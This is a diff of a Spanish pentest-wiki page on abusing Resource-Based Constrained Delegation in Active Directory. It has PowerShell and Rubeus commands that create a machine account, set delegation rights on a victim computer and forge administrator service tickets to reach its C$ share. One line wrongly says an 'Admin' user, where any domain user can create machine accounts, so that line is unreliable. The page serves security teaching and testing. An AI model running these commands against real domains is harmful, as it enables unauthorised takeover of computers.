@@ -5,58 +5,58 @@
 
 ## Conceptos Básicos de la Delegación Constrain Basada en Recursos
 
-Esto es similar a la [Delegación Constrain](constrained-delegation.md) básica pero **en lugar** de dar permisos a un **objeto** para **suplantar a cualquier usuario contra un servicio**. La Delegación Constrain Basada en Recursos **establece** en **el objeto quién puede suplantar a cualquier usuario contra él**.
+Esto es similar a la [Delegación Constrain](constrained-delegation.md) básica pero **en lugar** de dar permisos a un **objeto** para **suplantar a cualquier usuario contra una máquina**. La Delegación Constrain Basada en Recursos **establece** en **el objeto quién puede suplantar a cualquier usuario contra él**.
 
 En este caso, el objeto restringido tendrá un atributo llamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con el nombre del usuario que puede suplantar a cualquier otro usuario contra él.
 
-Otra diferencia importante de esta Delegación Constrain con respecto a las otras delegaciones es que cualquier usuario con **permisos de escritura sobre una cuenta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) puede establecer el _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (En las otras formas de Delegación necesitabas privilegios de administrador de dominio).
+Otra diferencia importante de esta Delegación Constrain con respecto a las otras delegaciones es que cualquier usuario con **permisos de escritura sobre una cuenta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) puede establecer el **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (En las otras formas de Delegación necesitabas privilegios de administrador de dominio).
 
 ### Nuevos Conceptos
 
-En la Delegación Constrain se mencionó que el **`TrustedToAuthForDelegation`** flag dentro del valor _userAccountControl_ del usuario es necesario para realizar un **S4U2Self.** Pero eso no es completamente cierto.\
-La realidad es que incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **servicio** (tienes un SPN) pero, si **tienes `TrustedToAuthForDelegation`** el TGS devuelto será **Forwardable** y si **no tienes** ese flag el TGS devuelto **no será** **Forwardable**.
+En la Delegación Constrain se mencionó que la **`TrustedToAuthForDelegation`** bandera dentro del valor _userAccountControl_ del usuario es necesaria para realizar un **S4U2Self.** Pero eso no es completamente cierto.\
+La realidad es que incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **servicio** (tienes un SPN) pero, si **tienes `TrustedToAuthForDelegation`** el TGS devuelto será **Forwardable** y si **no tienes** esa bandera el TGS devuelto **no será** **Forwardable**.
 
-Sin embargo, si el **TGS** utilizado en **S4U2Proxy** **NO es Forwardable**, intentar abusar de una **delegación Constrain básica** **no funcionará**. Pero si estás tratando de explotar una **delegación Constrain basada en recursos, funcionará** (esto no es una vulnerabilidad, es una característica, aparentemente).
+Sin embargo, si el **TGS** utilizado en **S4U2Proxy** **NO es Forwardable** intentar abusar de una **delegación Constrain básica** **no funcionará**. Pero si estás tratando de explotar una **delegación Constrain basada en recursos, funcionará**.
 
 ### Estructura del Ataque
 
-> Si tienes **privilegios equivalentes de escritura** sobre una cuenta de **Computadora**, puedes obtener **acceso privilegiado** en esa máquina.
+> Si tienes **privilegios equivalentes de escritura** sobre una cuenta de **Computadora** puedes obtener **acceso privilegiado** en esa máquina.
 
 Supongamos que el atacante ya tiene **privilegios equivalentes de escritura sobre la computadora víctima**.
 
-1. El atacante **compromete** una cuenta que tiene un **SPN** o **crea uno** (“Servicio A”). Ten en cuenta que **cualquier** _Usuario Administrador_ sin ningún otro privilegio especial puede **crear** hasta 10 **objetos de Computadora (**_**MachineAccountQuota**_**)** y establecerles un **SPN**. Así que el atacante puede simplemente crear un objeto de Computadora y establecer un SPN.
+1. El atacante **compromete** una cuenta que tiene un **SPN** o **crea uno** (“Servicio A”). Ten en cuenta que **cualquier** _Usuario Admin_ sin ningún otro privilegio especial puede **crear** hasta 10 objetos de Computadora (**_MachineAccountQuota_**) y establecerles un **SPN**. Así que el atacante puede simplemente crear un objeto de Computadora y establecer un SPN.
 2. El atacante **abusa de su privilegio de ESCRITURA** sobre la computadora víctima (ServicioB) para configurar **delegación constrain basada en recursos para permitir que ServicioA suplantar a cualquier usuario** contra esa computadora víctima (ServicioB).
 3. El atacante utiliza Rubeus para realizar un **ataque S4U completo** (S4U2Self y S4U2Proxy) desde Servicio A a Servicio B para un usuario **con acceso privilegiado a Servicio B**.
-1. S4U2Self (desde la cuenta SPN comprometida/creada): Solicitar un **TGS de Administrador para mí** (No Forwardable).
-2. S4U2Proxy: Usar el **TGS no Forwardable** del paso anterior para solicitar un **TGS** de **Administrador** para el **host víctima**.
+1. S4U2Self (desde la cuenta SPN comprometida/creada): Pide un **TGS de Administrador para mí** (No Forwardable).
+2. S4U2Proxy: Usa el **TGS no Forwardable** del paso anterior para pedir un **TGS** de **Administrador** para el **host víctima**.
 3. Incluso si estás usando un TGS no Forwardable, como estás explotando la delegación constrain basada en recursos, funcionará.
 4. El atacante puede **pasar el ticket** y **suplantar** al usuario para obtener **acceso al ServicioB víctima**.
 
 Para verificar el _**MachineAccountQuota**_ del dominio puedes usar:
-```powershell
+```bash
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
 ## Ataque
 
 ### Creando un Objeto de Computadora
 
-Puedes crear un objeto de computadora dentro del dominio usando [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
-```powershell
+Puedes crear un objeto de computadora dentro del dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
+```bash
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 
 # Check if created
 Get-DomainComputer SERVICEA
 ```
-### Configuración de R**esource-based Constrained Delegation**
+### Configuración de Delegación Constrainida Basada en Recursos
 
 **Usando el módulo de PowerShell de activedirectory**
-```powershell
+```bash
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
 **Usando powerview**
-```powershell
+```bash
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
 $SDBytes = New-Object byte[] ($SD.BinaryLength)
@@ -81,7 +81,7 @@ Ahora, se puede realizar el ataque:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Puedes generar más tickets solo pidiendo una vez usando el parámetro `/altservice` de Rubeus:
+Puedes generar más tickets para más servicios solo pidiendo una vez usando el parámetro `/altservice` de Rubeus:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
@@ -95,7 +95,7 @@ En este ejemplo se solicitó un TGS para el servicio **CIFS** desde Administrato
 ```bash
 ls \\victim.domain.local\C$
 ```
-### Abuso de diferentes tickets de servicio
+### Abusar de diferentes tickets de servicio
 
 Aprende sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#available-services).
 
@@ -115,5 +115,6 @@ Aprende sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#a
 - [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
 - [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
 - [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
+- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
 
 {{#include ../../banners/hacktricks-training.md}}
